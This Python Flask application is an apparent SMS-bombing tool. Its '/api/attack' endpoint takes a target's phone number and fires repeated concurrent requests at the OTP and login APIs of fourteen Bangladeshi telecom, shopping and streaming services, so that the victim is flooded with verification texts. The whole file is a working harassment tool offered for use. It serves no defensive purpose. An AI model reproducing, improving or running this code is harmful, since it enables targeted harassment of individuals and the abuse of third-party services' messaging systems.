from flask import Flask, render_template, request, jsonify
import requests
import concurrent.futures

app = Flask(__name__)

API_CONFIGS = [
    {"url": "https://weblogin.grameenphone.com/backend/api/v1/otp", "data": {"msisdn": ""}},
    {"url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "data": {"number": ""}},
    {"url": "https://api.apex4u.com/api/auth/login", "data": {"phoneNumber": ""}},
    {"url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", "data": {"number": ""}},
    {"url": "https://www.pickaboo.com/rest/default/V1/customer-check/exist", "data": {"mobile": ""}},
    {"url": "https://bikroy.com/data/phone_number_login/verifications/phone_login", "method": "GET"},
    {"url": "https://prod-services.toffeelive.com/sms/v1/subscriber/signup", "data": {"mobile": ""}},
    {"url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "data": {"number": ""}},
    {"url": "https://web-api.banglalink.net/api/v1/user/number/validation/", "method": "GET"},
    {"url": "https://api.shajgoj.com/api/v2/auth/send-otp", "data": {"mobile": ""}},
    {"url": "https://care.banglalink.net/api/v1/auth/send-otp", "data": {"msisdn": ""}},
    {"url": "https://www.daraz.com.bd/customer/api/send_otp", "data": {"phone": ""}},
    {"url": "https://api.foodpanda.com.bd/api/v1/login/otp", "data": {"phone": ""}},
    {"url": "https://api.osudpotro.com/api/v1/users/send_otp", "data": {"phoneNumber": ""}}
]

def send_request(api, phone):
    try:
        url = api["url"]
        method = api.get("method", "POST")
        payload = api["data"].copy()
        for key in payload:
            payload[key] = phone
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
        
        if method.upper() == "POST":
            response = requests.post(url, json=payload, headers=headers, timeout=10)
        else:
            if "bikroy" in url:
                url = f"{url}?phone={phone}"
            response = requests.get(url, headers=headers, timeout=10)
        
        return {"success": response.status_code in [200, 201, 202], "status": response.status_code}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/attack', methods=['POST'])
def attack():
    data = request.get_json()
    phone = data.get('phone', '').strip()
    amount = data.get('amount', 1)
    
    if not phone or len(phone) < 10:
        return jsonify({"error": "Invalid phone number"}), 400
    
    if amount > 50:
        amount = 50
    
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_api = {}
        for _ in range(amount):
            for api in API_CONFIGS:
                future = executor.submit(send_request, api, phone)
                future_to_api[future] = api
        
        for future in concurrent.futures.as_completed(future_to_api):
            result = future.result()
            results.append(result)
    
    success_count = sum(1 for r in results if r.get("success", False))
    
    return jsonify({
        "total": len(results),
        "success": success_count,
        "failed": len(results) - success_count,
        "results": results
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
